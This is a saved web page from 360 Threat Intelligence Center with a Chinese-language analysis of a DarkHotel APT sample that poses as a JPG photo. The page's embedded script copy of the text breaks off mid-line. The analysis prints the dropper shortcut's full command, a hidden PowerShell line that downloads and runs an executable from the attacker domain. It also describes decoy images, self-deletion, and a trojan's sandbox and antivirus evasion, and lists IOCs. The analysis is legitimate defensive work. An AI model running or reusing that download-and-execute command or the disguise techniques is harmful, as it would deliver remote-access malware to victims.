<!DOCTYPE html><html data-n-head="" data-n-head-ssr><meta data-n-head="true" charset="utf-8"><meta data-n-head="true" content="width=device-width,initial-scale=1" name="viewport"><meta data-n-head="true" content="Nuxt.js project" name="description" data-hid="description"><title data-n-head="true">360威胁情报中心</title><link href="/fav.ico" rel="icon" data-n-head="true" type="image/x-icon"><link href="/_nuxt/manifest.38f62477280dcc27df9e.js" rel="preload" as="script"><link href="/_nuxt/vendor.bundle.45eca4dc7fa9e1bc4361.js" rel="preload" as="script"><link href="/_nuxt/nuxt.bundle.8e9d53f64bed77ebfe81.js" rel="preload" as="script"><link href="/_nuxt/0.nuxt.bundle.2f45ca512d92831b456d.js" rel="prefetch"><link href="/_nuxt/1.nuxt.bundle.ddf9ea85dc483e3df228.js" rel="prefetch"><link href="/_nuxt/2.nuxt.bundle.ae682d6568221e03d161.js" rel="prefetch"><link href="/_nuxt/3.nuxt.bundle.55fb549cb8ff45291a32.js" rel="prefetch"><link href="/_nuxt/4.nuxt.bundle.34c699b301359d6a3c4d.js" rel="prefetch"><link href="/_nuxt/5.nuxt.bundle.1375829ca49ba88d696d.js" rel="prefetch"><style data-vue-ssr-id="1cbf7f39:0 198c0e1e:0 034fd8e0:0 ba3a09e0:0 c2ba7178:0 01cb4693:0 69b5e360:0">.progress[data-v-862bdd9c]{position:fixed;top:0;left:0;right:0;height:2px;width:0;-webkit-transition:width .2s,opacity .4s;-o-transition:width .2s,opacity .4s;transition:width .2s,opacity .4s;opacity:1;background-color:#efc14e;z-index:999999}.hljs ::-webkit-scrollbar{width:8px;height:10px;border-radius:2px;background-color:#839496}.hljs ::-webkit-scrollbar-track{background-color:#bebebe}.hljs ::-webkit-scrollbar-thumb,.hljs ::-webkit-scrollbar-track{border-radius:2px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3)}.hljs ::-webkit-scrollbar-thumb{background-color:#789}html{font-family:Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;font-size:16px;word-spacing:1px;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-webkit-box-sizing:border-box;box-sizing:border-box}body{background-color:rgba(66,66,66,.05)}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;text-decoration:none}li{list-style-type:none}a:active,a:hover,a:link,a:visited{color:#0b1802}.main-body h1,.main-body h2,.main-body h3,.main-body h4,.main-body h5,.main-body h6{margin-top:0;margin-bottom:.5rem}.main-body p{margin-top:0;margin-bottom:1rem;font-size:15px;text-indent:25px;word-wrap:break-word}.main-body img{vertical-align:middle;border-style:none;margin:auto 20px auto auto;padding:3px;border-radius:3px;background-color:#e6e6d5;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.15);box-shadow:0 1px 2px rgba(0,0,0,.15);border:1px solid #b9baa6}.main-body .text-center{text-align:center!important}.main-body table{border-collapse:collapse!important;width:100%;max-width:100%;margin:1em 0;background-color:transparent}.main-body table tbody+tbody{border-top:2px solid #e9ecef}.main-body table td,.main-body table th{padding:.5rem;font-size:.95em;border-collapse:collapse}.main-body table tr{border:1px solid #dfe8fe}.main-body table tr:nth-child(odd){background-color:#ecf1fe}.main-body table tr:nth-child(2n){background-color:#fdfdfd}.main-body table td{white-space:normal;word-break:break-all}.main-body code,.main-body kbd,.main-body pre,.main-body samp{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.nav-bar[data-v-42857612]{height:60px;border-bottom:1px solid #d5d5d5}.nav-bar .ico-favicon[data-v-42857612]{height:28px;margin-top:16px;margin-left:108px;cursor:pointer}.nav-bar .ico-home[data-v-42857612]{width:32px;height:32px;display:inline-block;margin:16px 32px;float:right;cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACU0lEQVRYR+2XzZHaQBCFX48cAM4AStxNBmYzACSfDREYIjAbAcoA9mwkcARmM1jfocAZbADWPNfIDAtaCUmUXdhV6Cjm5+vX3Y+W4MqPXPl+XAzQWWxrSuvPJgCt1P2y23i+JJiLADqLbcuJ9RSCVnIp8RQ7arDsNp6qQlQG6IXrPiATIYTCoblQKAEFBDiKvOasCkRpgL3kEwH6BL5rpfo2YqOI0nomwDsCM63UqGxKSgGcSE4+xI4zTF9gAJ04DiDysUpKCgHSkhdJbNZXSUkuQJ7k+0inFHmMPDfIync6JZHnDvLqIhOgs9jWnVgvkio/kvxwMDkO/ebyXLFlpKS77DZ26T2vALz5ukORqQA1ggMreS/cmIrva6U6WQflwZh9AkwIPAs5SIOfAHjzTQDBJ3tY6LliJQfkR+i7SdtVfXrhZixAYloEgshzR/aMA0AvXK8E8h7kV4rUTUsZALMZ4K6o+M5BWQDTvuZckKvQb94lHmI3mugp2JnCsjAWQGm1mn9orKpGbtdbANHqTivdEqJu1cwswr8JkA7kBlCogOmCsr5+phWTLjA18P+lwP+ybf98g501nxdfQC0r4thxzD/hyVxw3AWVFUhfYp0ttyXJh9Bv9o9//9MAufn0wg0JPkZes30DuCnwTyoQK/U2bWqZTniYC8hueoA411L5XbBeCaUV+u4r78gEMOZDpb/Zjw6Ah6+e/axQN5Pv8ftkrUh7P/kcjIgird/TFe4jzx0XjmR2QQIh8ZCS7XhlZwMhDPwsb4YsHMvLXnTpuqsD/AKIkSQ/Gqk/IAAAAABJRU5ErkJggg==) no-repeat}.nav-bar .ico-home[data-v-42857612]:hover{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACRElEQVRYR+2XT5LSQBTGvy9B13gDbmBuIJSJ65kTGKqEciecQOYEsJxKrII5gboVLJgbzNwAb8Aah7ypjmnMNPlLaaFV9DLV3e/3vvcnr4kTL57YPo4G8JfSfP6Aj8qBbQNXsw43xzhzFEDvmzggpiQcZVQEdxB0wze8qwtRG6D3XXwIxhRQLAyUQUaYCCEghuFrzupAVAZQkj/bYUzAB3AvEXztsVKEFpThlwLMftoYVg1JJQBD8putjYFpIM6JHSYA3tYJSSmAKXmZxGp/nZDkAuRJnng6heA28Kg8PlhmSEKX3by8yAR4v5TW7gGfkyzfS566eBS4/FKUbGZI7AYurztcm2cOAPoLuRBgSqApRFdL3p/LAIRv2bjIuigPJjk3FmBDoGuCPwHoLWRC4IO+LHBJLbkAP0KXcdnVXf25jMBfTQuCSeBxqO/YA/TmsiLxSgRfSbRUSSkAdVgsrMuSrwgqBXCflOoqdNmJe4g+GHsvWKvE0jAaIAJWnzyu6nqu92uASNCxAEeIllYzMwn/JoDpyBmgVAFVBVX7ekEpxlWgcuD/C8G7ubQbDax180n1hWamxxGG5lyQroLaCphGdGcrKMmbwKX6Ze/XnwbIjWd/ISKC29Bj+wxwVuCfVGBr44XZ1LI74e+54NIcIIpKKq8K4p8b4AQeD3pHJoBqPhaxjOcH9egg9q8eIp4VWub35N/eVpMPgPQDxVHTFQRXgcdR6UimNygIIn54ZHe86sPBhsQsb4YsHcur2zlu58kBHgGcWwk/vbbC3wAAAABJRU5ErkJggg==) no-repeat}.disPic .pic[data-v-42857612]{background-color:#faa732;height:480px;width:100%}.article-page[data-v-8db87e62]{margin:0 auto;max-width:1108px;background-size:cover}.article-page .page-header[data-v-8db87e62]{border-bottom:1px solid #efefef}.article-page .page-header .ava img[data-v-8db87e62]{border-radius:50%;height:56px;width:56px;float:left;margin:12px}.article-page .page-header .title[data-v-8db87e62]{font-size:48px;color:#0b1802;font-family:"Verdana, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, Geneva, 'sans-serif'"}.article-page .page-header .author[data-v-8db87e62]{display:inline-block;color:#979996;font-size:16px;font-family:"Verdana, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, Geneva, 'sans-serif'";margin:12px 7px 12px 0;line-height:16px}.article-page .page-header .author .ico-time img[data-v-8db87e62]{width:16px;height:16px}.article-page .main-body[data-v-8db87e62]{padding:0 108px;margin:28px auto 168px;background:url(/_nuxt/img/post-entry-bg.98216ca.png) no-repeat -10px 9px}.article-page .back-top[data-v-8db87e62]{width:48px;height:48px;position:fixed;bottom:30px;right:20px;background:url(/_nuxt/img/top.1d1a857.png) no-repeat}.article-page .back-top[data-v-8db87e62]:hover{cursor:pointer;background:url(/_nuxt/img/top-light.0cd636b.png) no-repeat}.title-home[data-v-552f8598]{font-family:sans-serif;line-height:32px;font-size:24px;color:#0b1802;cursor:pointer;max-height:32px;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis}.title-home[data-v-552f8598]:hover{text-shadow:2px 3px 1px #d0d0d0}.title-detail[data-v-552f8598]{font-size:48px;color:#0b1802;font-family:Arial Rounded MT Bold;margin-top:48px;line-height:64px}@media screen and (min-width:550px) and (max-width:950px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}@media screen and (max-width:550px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}.tags[data-v-53a17526]{height:42px;padding-top:10px}.tag[data-v-53a17526]{background-color:#6aacd8;display:inline-block;height:22px;font-size:13px;color:#fefefe;font-family:sans-serif;padding:2px 6px;margin-right:8px;border-radius:2px}</style><body data-n-head=""><div data-server-rendered="true" id="__nuxt"><div class="progress" data-v-862bdd9c style="width:0%;height:2px;background-color:#3b8070;opacity:0"></div><div><section><div data-v-42857612><div class="nav-bar" data-v-42857612><a href="/" data-v-42857612><img src="/_nuxt/img/blog-icon.f80549d.png" class="ico-favicon" data-v-42857612></a><div class="ico-home" data-v-42857612></div></div><!----></div><div class="article-page" data-v-8db87e62><div class="page-header" data-v-8db87e62><div class="title-detail" data-v-552f8598 data-v-8db87e62>DarkHotel定向攻击样本分析</div><div class="ava" data-v-8db87e62><img data-v-8db87e62></div><div class="tags" data-v-53a17526 data-v-8db87e62><p class="tag" data-v-53a17526>DARKHOTEL<p class="tag" data-v-53a17526>APT</div><div class="author lh32" data-v-8db87e62>代慧平 on</div></div><div class="main-body" data-v-8db87e62><h2 class="line" data-line="0">引言</h2><p class="line" data-line="2">人在做，天在看。<p class="line" data-line="4">360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。<p class="text-center line" data-line="6"><img src="/uploads/2017/07/25/b94e98a75d80901569781b7706c462a3.png" alt="" width="90%"><p class="line" data-line="8">DarkHotel团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。<h2 class="line" data-line="10">样本分析</h2><h3 class="line" data-line="12">基本信息</h3><center><table><thead><tr><th><th><tbody><tr><td><strong>样本MD5</strong><td>43f3b56c1c01b007c35197c703e4d6a6<tr><td><strong>样本大小</strong><td>131,072 Bytes<tr><td><strong>编译时间</strong><td>2015-10-15 22:52:30<tr><td><strong>文件名</strong><td>DSC3013.JPG.scr</table></center><p class="line" data-line="23">样本截图：<p class="text-center line" data-line="25"><img src="/uploads/2017/07/25/00bdf6b50ed64629185aa0f4c0af9b49.png" alt="" width="90%"><h3 class="line" data-line="27">详细行为</h3><p class="line" data-line="29">总体来说，样本的功能很简单，是一个典型的下载器诱饵。得到点击运行机会以后，样本会从自身释放3个图片和1个快捷方式到TEMP目录下；调用mspaint打开3个图片中的一个文件，执行TEMP目录下的快捷方式，快捷方式运行起来后会启动powershell从<code>http://all-microsoft-control.com/kd/f.exe</code>下载PE并执行。<p class="line" data-line="31">样本首先会获取TEMP目录的路径：<p class="text-center line" data-line="33"><img src="/uploads/2017/07/25/115b3d5f8c7da4f3b907e8ac19dd4104.png" alt=""><p class="line" data-line="35">然后拼出4个路径：<ul><li><p>%temp%\DSC3013.JPG<li><p>%temp%\DSC3014.JPG<li><p>%temp%\DSC3015.JPG<li><p>%temp%\desktop.lnk</ul><p class="text-center line" data-line="45"><img src="/uploads/2017/07/25/6069b840d7398d5f48154c2d40cac2ae.png" alt="" width="90%"><p class="line" data-line="47">会从自身文件的0x406b20的偏移处读取0xead字节的数据写入到DSC3013.JPG、DSC3014.JPG和DSC3015.JPG文件中；<p class="text-center line" data-line="49"><img src="/uploads/2017/07/25/0bbb522a245a8fbbc734d4a54a8535ba.png" alt="" width="90%"><p class="line" data-line="51">数据为JPG图片格式文件，如图：<p class="text-center line" data-line="53"><img src="/uploads/2017/07/25/acba031979dbc593e8dc49992c70318a.png" alt="" width="90%"><p class="line" data-line="55">图片是纯白色背景的JPG文件，因为这种纯色文件通过JPG格式的压缩后占用的空间比较小。<p class="text-center line" data-line="57"><img src="/uploads/2017/07/25/8569fdab5bafba66d82202502ae7230c.png" alt="" width="90%"><p class="line" data-line="59">数据同时写入到刚才创建的3个隐藏的图片文件中，CreateFile的倒数第二个参数为2，表示该文件是隐藏的状态。<p class="text-center line" data-line="61"><img src="/uploads/2017/07/25/fdcc62d03d69a9d1484e7505198ed139.png" alt="" width="90%"><p class="line" data-line="63">之后会调用mspaint.exe打开DSC3013.jpg文件，因为木马样本的文件名为DSC3013.JPG.scr，而且木马样本也是图片图标，所以用图片打开DSC3013.jpg文件迷惑受害者:<p class="text-center line" data-line="65"><img src="/uploads/2017/07/25/61dfbe5f493472fca4433423ce0868ed.png" alt="" width="90%"><p class="line" data-line="67">接下来会在同目录下再创建3个不隐藏的图片文件，并写入同样的数据：<p class="text-center line" data-line="69"><img src="/uploads/2017/07/25/45f814441f410f839b2add1ffde8d73f.png" alt="" width="90%"><p class="line" data-line="71">然后创建隐藏的desktop.lnk文件，把从文件的0x406088 处读取到的数据写入到该文件，并通过ShellExecute运行起来该快捷方式文件：<p class="text-center line" data-line="73"><img src="/uploads/2017/07/25/767b77b1e45f1b449a46e065cdcff29b.png" alt="" width="90%"><p class="line" data-line="75">文件的0x406088偏移处是一个快捷方式格式的文件，如图能看到快捷方式的参数信息：<p class="text-center line" data-line="77"><img src="/uploads/2017/07/25/8517464a5af5bdb701d80b6453373bf9.png" alt="" width="90%"><p class="line" data-line="79">把该块数据段保存成LNK文件，命令行参数如下：<p class="text-center line" data-line="81"><img src="/uploads/2017/07/25/928be2ad6fc6d2623f0d6a4c16b4350b.png" alt=""><p class="line" data-line="83">快捷方式指向的目标为：<pre class="hljs"><code class="hljs">%COMSPEC% /c powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://all-microsoft-control.com/kd/f.exe ','%temp%\~$ER96F\.doc')&&echo f|xcopy %temp%\~$ER96F.doc %temp%\dwm.exe /H /Y&&%temp%\dwm.exe
</code></pre><p class="line" data-line="89">所以快捷方式被执行起来后，会调用powershell从http://all-microsoft-control.com/kd/f.exe下载到%temp%\~$ER96F.doc，并把该文件重命名为dwm.exe后，运行起来。<p class="line" data-line="91">最后会在同目录下生成desktop.bat，并把“del *.scr\r\ndel *.bat”代码写入进去，试图删除掉该目录下所有的scr和bat后缀的文件，让目录看起来只有正常的图片文件。<p class="text-center line" data-line="93"><img src="/uploads/2017/07/25/f480320173f2d9f1716f6eb576e37ff1.png" alt="" width="90%"><h3 class="line" data-line="95">远控木马</h3><p class="line" data-line="97">目前通过URL下载的dwm.exe已经失效，但从360公司海量的样本库中找到了这个文件不难：<p class="text-center line" data-line="99"><img src="/uploads/2017/07/25/9d0ea33a223c2fdebd03a895edf31ceb.png" alt="" width="90%"><p class="line" data-line="101">分析显示此dwm.exe是一个使用OpenSSL协议的远控木马：<p class="text-center line" data-line="103"><img src="/uploads/2017/07/25/74fcf6804bd22443ceb47358fc021ec2.png" alt="" width="90%"><p class="line" data-line="105">样本的字符串加密存储样本里的，关键API都用解密后的字符串动态加载：<p class="text-center line" data-line="107"><img src="/uploads/2017/07/25/868677a706a24e956502810888c868cc.png" alt="" width="90%"><p class="line" data-line="109">sub_497036是字符串的解密函数：<p class="text-center line" data-line="111"><img src="/uploads/2017/07/25/c8f76a42d257ba8817e8b80416c2f570.png" alt=""><p class="line" data-line="113">样本会检测虚拟机、沙箱和杀软：<p class="line" data-line="115">卡巴<p class="text-center line" data-line="117"><img src="/uploads/2017/07/25/6b5c4521e39cf81dc97b2e2a9db91a55.png" alt="" width="90%"><p class="line" data-line="119">沙箱检测：<p class="text-center line" data-line="121"><img src="/uploads/2017/07/25/fff4437f85266db166109fd32f6b86cc.png" alt=""><p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/d2b88af9186a3f06f23b0318416a98bc.png" alt=""><p class="line" data-line="125">检测360的产品:<p class="text-center line" data-line="127"><img src="/uploads/2017/07/25/600f0fbdf110cdd3b07a651bcfbb6c8e.png" alt="" width="90%"><p class="line" data-line="129">检测金山和baidu的安全产品：<p class="text-center line" data-line="131"><img src="/uploads/2017/07/25/b16792e0261b9c2d3068a6e226d8b3ff.png" alt="" width="90%"><p class="line" data-line="133">检测通过后，会连接C&C地址的80端口，走SSL通信协议，把请求的数据包加密放到URL里，然后进行通信：<p class="text-center line" data-line="135"><img src="/uploads/2017/07/25/7515b38914cd0b2fe7495d5089164ac1.png" alt="" width="90%"><p class="line" data-line="137">C&C域名为：view-drama-online.com<h2 class="line" data-line="139">相关分析</h2><p class="line" data-line="141">使用高级账号查询360威胁情报中心，样本涉及的域名 all-microsoft-control.com 其实早就被内部分析团队打上了相关的标签，而外部的大部分威胁情报平台对此域名没有做什么恶意性标记：<p class="text-center line" data-line="143"><img src="/uploads/2017/07/25/d103771b3712fc6fae4ab8e6f460bdcb.png" alt=""><p class="line" data-line="145">域名注册于2015年7月26日，在卡巴斯基在2014年的揭露报告以后注册，由此可见APT团伙在被公开以后并不会停止活动，根据我们的分析甚至手法上都没有大的改变。<p class="line" data-line="147">虽然目前我们从那个域名已经下载不到 .EXE 的进一步恶意代码，但威胁情报中心包含的同源样本沙箱日志记录告诉我们还有多个历史下载路径：<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/4d53ddecf1f93575b5c6b4ac64455edf.png" alt="" width="90%"><p class="line" data-line="151">事实上，利用360威胁情报中心的基础数据，从一个域名、样本出发我们可以把DarkHotel团伙相关的很大一部分所使用的工具和网络基础设施信息关联出来，在此基础上分析其活动历史，甚至最终定位到幕后的来源。<h2 class="line" data-line="153">关联组织</h2><p class="line" data-line="155">360公司内部的长期跟踪了代号为APT-C-06的境外APT组织，其主要目标除了中国，还有其他国家，主要目的是窃取敏感数据信息，DarkHotel的活动可以视为APT-C-06组织一系列活动之一。在针对中国地区的攻击中，该组织主要针对政府、科研领域进行攻击，且非常专注于某特定领域，相关攻击行动最早可以追溯到2007年，至今还非常活跃。<p class="line" data-line="157">该组织多次利用0day漏洞发动攻击，进一步使用的恶意代码非常复杂，相关功能模块达到数十种，涉及恶意代码数量超过200个。该组织主要针对Windows系统进行攻击，近期还会对基于Android系统的移动设备进行攻击。另外该组织进行载荷投递的方式除了传统的鱼叉邮件和水坑式攻击等常见手法，还主要基于另一种特殊的攻击手法。<p class="line" data-line="159">我们将APT-C-06组织和其他APT组织的TTPs（战术、技术与步骤）进行了对比分析，该组织无论是整体实力还是威胁等级在现有的APT组织中都是属于很高的级别。从我们掌握的证据来看该组织有可能是由境外政府支持的黑客团体或情报机构。<h2 class="line" data-line="161">IOC</h2><center><table><thead><tr><th><th><tbody><tr><td><strong>类型</strong><td><strong>值</strong><tr><td><em>Downloader Domain</em><td>all-microsoft-control.com<tr><td><em>C&C Domain</em><td>view-drama-online.com</table></center></div><div class="back-top" data-v-8db87e62></div></div></section></div></div><script type="text/javascript">window.__NUXT__={layout:"default",data:[{articleData:{_id:"597733a71c670a09e493ee3e",title:"DarkHotel定向攻击样本分析",category:"事件追踪",readableId:"darkhotel-targeted-attack-sample-analysis",abstract:"360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。这个团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。",author:"代慧平",headImg:"/uploads/2017/08/17/daee2836562e4dcbddcaaab6ed605466.png",descImg:null,tags:["DarkHotel","APT"],publish_time:"2016-05-13T19:25:41.000Z",content:'<h2 class="line" data-line="0">引言</h2>\n<p class="line" data-line="2">人在做，天在看。</p>\n<p class="line" data-line="4">360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。</p>\n<p class="text-center line" data-line="6"><img src="/uploads/2017/07/25/b94e98a75d80901569781b7706c462a3.png" alt="" width="90%"></p>\n<p class="line" data-line="8">DarkHotel团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。</p>\n<h2 class="line" data-line="10">样本分析</h2>\n<h3 class="line" data-line="12">基本信息</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>样本MD5</strong></td>\n<td>43f3b56c1c01b007c35197c703e4d6a6</td>\n</tr>\n<tr>\n<td><strong>样本大小</strong></td>\n<td>131,072 Bytes</td>\n</tr>\n<tr>\n<td><strong>编译时间</strong></td>\n<td>2015-10-15  22:52:30</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>DSC3013.JPG.scr</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="23">样本截图：</p>\n<p class="text-center line" data-line="25"><img src="/uploads/2017/07/25/00bdf6b50ed64629185aa0f4c0af9b49.png" alt="" width="90%"></p>\n<h3 class="line" data-line="27">详细行为</h3>\n<p class="line" data-line="29">总体来说，样本的功能很简单，是一个典型的下载器诱饵。得到点击运行机会以后，样本会从自身释放3个图片和1个快捷方式到TEMP目录下；调用mspaint打开3个图片中的一个文件，执行TEMP目录下的快捷方式，快捷方式运行起来后会启动powershell从<code>http://all-microsoft-control.com/kd/f.exe</code>下载PE并执行。</p>\n<p class="line" data-line="31">样本首先会获取TEMP目录的路径：</p>\n<p class="text-center line" data-line="33"><img src="/uploads/2017/07/25/115b3d5f8c7da4f3b907e8ac19dd4104.png" alt=""></p>\n<p class="line" data-line="35">然后拼出4个路径：</p>\n<ul>\n<li>\n<p>%temp%\\DSC3013.JPG</p>\n</li>\n<li>\n<p>%temp%\\DSC3014.JPG</p>\n</li>\n<li>\n<p>%temp%\\DSC3015.JPG</p>\n</li>\n<li>\n<p>%temp%\\desktop.lnk</p>\n</li>\n</ul>\n<p class="text-center line" data-line="45"><img src="/uploads/2017/07/25/6069b840d7398d5f48154c2d40cac2ae.png" alt="" width="90%"></p>\n<p class="line" data-line="47">会从自身文件的0x406b20的偏移处读取0xead字节的数据写入到DSC3013.JPG、DSC3014.JPG和DSC3015.JPG文件中；</p>\n<p class="text-center line" data-line="49"><img src="/uploads/2017/07/25/0bbb522a245a8fbbc734d4a54a8535ba.png" alt="" width="90%"></p>\n<p class="line" data-line="51">数据为JPG图片格式文件，如图：</p>\n<p class="text-center line" data-line="53"><img src="/uploads/2017/07/25/acba031979dbc593e8dc49992c70318a.png" alt="" width="90%"></p>\n<p class="line" data-line="55">图片是纯白色背景的JPG文件，因为这种纯色文件通过JPG格式的压缩后占用的空间比较小。</p>\n<p class="text-center line" data-line="57"><img src="/uploads/2017/07/25/8569fdab5bafba66d82202502ae7230c.png" alt="" width="90%"></p>\n<p class="line" data-line="59">数据同时写入到刚才创建的3个隐藏的图片文件中，CreateFile的倒数第二个参数为2，表示该文件是隐藏的状态。</p>\n<p class="text-center line" data-line="61"><img src="/uploads/2017/07/25/fdcc62d03d69a9d1484e7505198ed139.png" alt="" width="90%"></p>\n<p class="line" data-line="63">之后会调用mspaint.exe打开DSC3013.jpg文件，因为木马样本的文件名为DSC3013.JPG.scr，而且木马样本也是图片图标，所以用图片打开DSC3013.jpg文件迷惑受害者:</p>\n<p class="text-center line" data-line="65"><img src="/uploads/2017/07/25/61dfbe5f493472fca4433423ce0868ed.png" alt="" width="90%"></p>\n<p class="line" data-line="67">接下来会在同目录下再创建3个不隐藏的图片文件，并写入同样的数据：</p>\n<p class="text-center line" data-line="69"><img src="/uploads/2017/07/25/45f814441f410f839b2add1ffde8d73f.png" alt="" width="90%"></p>\n<p class="line" data-line="71">然后创建隐藏的desktop.lnk文件，把从文件的0x406088 处读取到的数据写入到该文件，并通过ShellExecute运行起来该快捷方式文件：</p>\n<p class="text-center line" data-line="73"><img src="/uploads/2017/07/25/767b77b1e45f1b449a46e065cdcff29b.png" alt="" width="90%"></p>\n<p class="line" data-line="75">文件的0x406088偏移处是一个快捷方式格式的文件，如图能看到快捷方式的参数信息：</p>\n<p class="text-center line" data-line="77"><img src="/uploads/2017/07/25/8517464a5af5bdb701d80b6453373bf9.png" alt="" width="90%"></p>\n<p class="line" data-line="79">把该块数据段保存成LNK文件，命令行参数如下：</p>\n<p class="text-center line" data-line="81"><img src="/uploads/2017/07/25/928be2ad6fc6d2623f0d6a4c16b4350b.png" alt=""></p>\n<p class="line" data-line="83">快捷方式指向的目标为：</p>\n<pre class="hljs"><code class="hljs">%COMSPEC% /c powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://all-microsoft-control.com/kd/f.exe \',\'%temp%\\~$ER96F\\.doc\')&&echo f|xcopy %temp%\\~$ER96F.doc %temp%\\dwm.exe /H /Y&&%temp%\\dwm.exe\n</code></pre>\n<p class="line" data-line="89">所以快捷方式被执行起来后，会调用powershell从http://all-microsoft-control.com/kd/f.exe下载到%temp%\\~$ER96F.doc，并把该文件重命名为dwm.exe后，运行起来。</p>\n<p class="line" data-line="91">最后会在同目录下生成desktop.bat，并把“del *.scr\\r\\ndel *.bat”代码写入进去，试图删除掉该目录下所有的scr和bat后缀的文件，让目录看起来只有正常的图片文件。</p>\n<p class="text-center line" data-line="93"><img src="/uploads/2017/07/25/f480320173f2d9f1716f6eb576e37ff1.png" alt="" width="90%"></p>\n<h3 class="line" data-line="95">远控木马</h3>\n<p class="line" data-line="97">目前通过URL下载的dwm.exe已经失效，但从360公司海量的样本库中找到了这个文件不难：</p>\n<p class="text-center line" data-line="99"><img src="/uploads/2017/07/25/9d0ea33a223c2fdebd03a895edf31ceb.png" alt="" width="90%"></p>\n<p class="line" data-line="101">分析显示此dwm.exe是一个使用OpenSSL协议的远控木马：</p>\n<p class="text-center line" data-line="103"><img src="/uploads/2017/07/25/74fcf6804bd22443ceb47358fc021ec2.png" alt="" width="90%"></p>\n<p class="line" data-line="105">样本的字符串加密存储样本里的，关键API都用解密后的字符串动态加载：</p>\n<p class="text-center line" data-line="107"><img src="/uploads/2017/07/25/868677a706a24e956502810888c868cc.png" alt="" width="90%"></p>\n<p class="line" data-line="109">sub_497036是字符串的解密函数：</p>\n<p class="text-center line" data-line="111"><img src="/uploads/2017/07/25/c8f76a42d257ba8817e8b80416c2f570.png" alt=""></p>\n<p class="line" data-line="113">样本会检测虚拟机、沙箱和杀软：</p>\n<p class="line" data-line="115">卡巴</p>\n<p class="text-center line" data-line="117"><img src="/uploads/2017/07/25/6b5c4521e39cf81dc97b2e2a9db91a55.png" alt="" width="90%"></p>\n<p class="line" data-line="119">沙箱检测：</p>\n<p class="text-center line" data-line="121"><img src="/uploads/2017/07/25/fff4437f85266db166109fd32f6b86cc.png" alt=""></p>\n<p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/d2b88af9186a3f06f23b0318416a98bc.png" alt=""></p>\n<p class="line" data-line="125">检测360的产品:</p>\n<p class="text-center line" data-line="127"><img src="/uploads/2017/07/25/600f0fbdf110cdd3b07a651bcfbb6c8e.png" alt="" width="90%"></p>\n<p class="line" data-line="129">检测金山和baidu的安全产品：</p>\n<p class="text-center line" data-line="131"><img src="/uploads/2017/07/25/b16792e0261b9c2d3068a6e226d8b3ff.png" alt="" width="90%"></p>\n<p class="line" data-line="133">检测通过后，会连接C&amp;C地址的80端口，走SSL通信协议，把请求的数据包加密放到URL里，然后进行通信：</p>\n<p class="text-center line" data-line="135"><img src="/uploads/2017/07/25/7515b38914cd0b2fe7495d5089164ac1.png" alt="" width="90%"></p>\n<p class="line" data-line="137">C&amp;C域名为：view-drama-online.com</p>\n<h2 class="line" data-line="139">相关分析</h2>\n<p class="line" data-line="141">使用高级账号查询360威胁情报中心，样本涉及的域名 all-microsoft-control.com 其实早就被内部分析团队打上了相关的标签，而外部的大部分威胁情报平台对此域名没有做什么恶意性标记：</p>\n<p class="text-center line" data-line="143"><img src="/uploads/2017/07/25/d103771b3712fc6fae4ab8e6f460bdcb.png" alt=""></p>\n<p class="line" data-line="145">域名注册于2015年7月26日，在卡巴斯基在2014年的揭露报告以后注册，由此可见APT团伙在被公开以后并不会停止活动，根据我们的分析甚至手法上都没有大的改变。</p>\n<p class="line" data-line="147">虽然目前我们从那个域名已经下载不到 .EXE 的进一步恶意代码，但威胁情报中心包含的同源样本沙箱日志记录告诉我们还有多个历史下载路径：</p>\n<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/4d53ddecf1f93575b5c6b4ac64455edf.png" alt="" width="90%"></p>\n<p class="line" data-line="151">事实上，利用360威胁情报中心的基础数据，从一个域名、样本出发我们可以把DarkHotel团伙相关的很大一部分所使用的工具和网络基础设施信息关联出来，在此基础上分析其活动历史，甚至最终定位到幕后的来源。</p>\n<h2 class="line" data-line="153">关联组织</h2>\n<p class="line" 